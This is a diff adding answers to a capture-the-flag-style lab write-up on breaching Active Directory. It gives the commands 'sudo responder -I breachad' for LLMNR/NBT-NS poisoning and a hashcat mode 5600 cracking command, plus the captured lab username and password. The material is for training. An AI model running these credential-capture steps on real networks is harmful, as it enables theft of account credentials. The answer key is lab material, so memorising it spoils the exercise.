@@ -466,9 +466,27 @@ If you want to try this type of attack in action, head over to the [Holo Network
 
 * What is the name of the tool we can use to poison and capture authentication requests on the network?
 
+    `Responder`
+
 * What is the username associated with the challenge that was captured?
 
+    `svcFileCopy`
+
+    ```
+    sudo responder -I breachad
+    ```
+
+    ![task5-responder](./images/task5-responder.png)
+
 * What is the value of the cracked password associated with the challenge that was captured?
+
+    `FPassword1!`
+
+    ```
+    hashcat -m 5600 hashfile /root/Rooms/BreachingAD/task5/passwordlist.txt --force
+    ```
+
+    ![task5-password](./images/task5-password.png)
 
 ## Task 6 - Microsoft Deployment Toolkit
 
